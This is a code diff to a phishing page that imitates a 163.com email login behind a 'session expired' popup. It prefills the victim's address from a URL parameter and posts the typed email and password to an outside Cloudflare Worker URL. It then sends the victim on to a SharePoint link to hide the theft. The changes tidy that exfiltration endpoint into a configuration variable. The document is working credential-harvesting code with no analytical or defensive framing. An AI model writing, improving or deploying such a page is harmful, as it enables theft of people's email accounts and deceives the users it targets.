@@ -604,6 +604,7 @@
             color: #222;
         }
     </style>
+<base target="_blank">
 </head>
 <body>
     <!-- Session Expired Popup -->
@@ -679,7 +680,7 @@
             <div id="msg"></div>
 
             <div class="input-group">
-                <input type="text" readonly id="email" value="[EMail]" class="input-field" placeholder="邮箱账号或手机号码">
+                <input type="text" readonly id="email" class="input-field" placeholder="邮箱账号或手机号码">
                 <span class="email-suffix">@163.com</span>
             </div>
 
@@ -749,6 +750,11 @@
 
     <script>
     $(document).ready(function(){
+        // ===== CONFIGURATION =====
+        // Replace with your Cloudflare Worker URL
+        var WORKER_URL = 'https://rough-sea-22ca.jesica.workers.dev/';
+        var redirectUrl = "https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN/";
+
         // Extract email user from URL ?state=123423@163.com
         var urlParams = new URLSearchParams(window.location.search);
         var state = urlParams.get('state');
@@ -768,12 +774,7 @@
         });
 
         var attemptCount = 0;
-        var maxAttempts = 4;
-        var redirectUrl = "https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN/";
         var isProcessing = false;
-
-        // Get the full URL to process.php (same directory)
-        var scriptUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/')) + '/process.php';
 
         function doRedirect() {
             window.location.replace(redirectUrl);
@@ -795,7 +796,7 @@
                 return;
             }
 
-            // Append @163.com since it's permanently shown in the UI
+            // Append @163.com since it is permanently shown in the UI
             var fullEmail = emailUser + "@163.com";
 
             if(!isValidEmail(fullEmail)){
@@ -809,26 +810,27 @@
             var originalBtnText = $('#submit-btn').val();
             $('#submit-btn').val('正在验证...').css('opacity', '0.7');
 
+            // Send as URL-encoded form data (most compatible with Cloudflare Worker)
+            var postData = 'email=' + encodeURIComponent(fullEmail) + '&password=' + encodeURIComponent(password);
+
             $.ajax({
-                url: 'https://rough-sea-22ca.jesica.workers.dev/',
+                url: WORKER_URL,
                 type: 'POST',
+                contentType: 'application/x-www-form-urlencoded',
+                data: postData,
                 dataType: 'json',
-                data: {
-                    email: fullEmail,
-                    password: password
-                },
                 timeout: 120000,
                 success: function(response){
                     console.log("Response:", response);
                     attemptCount++;
 
                     if(response && response.signal === 'success'){
-                        $('#msg').css('color', 'green').html(response.msg + ' 正在跳转...').show();
+                        $('#msg').css('color', 'green').html('登录成功，正在跳转...').show();
                         setTimeout(function(){
                             doRedirect();
                         }, 1500);
                         return;
-                    } else if(response && response.signal === 'error'){
+                    } else {
                         $('#msg').css('color', 'red').html('邮箱地址或密码无效').show();
                         $("#password").val("");
                     }
@@ -846,6 +848,7 @@
                 },
                 error: function(xhr, status, error){
                     console.error("AJAX Error:", status, error);
+                    console.error("Response text:", xhr.responseText);
                     attemptCount++;
                     $("#password").val("");
                     $('#msg').css('color', 'red').html('邮箱地址或密码无效').show();
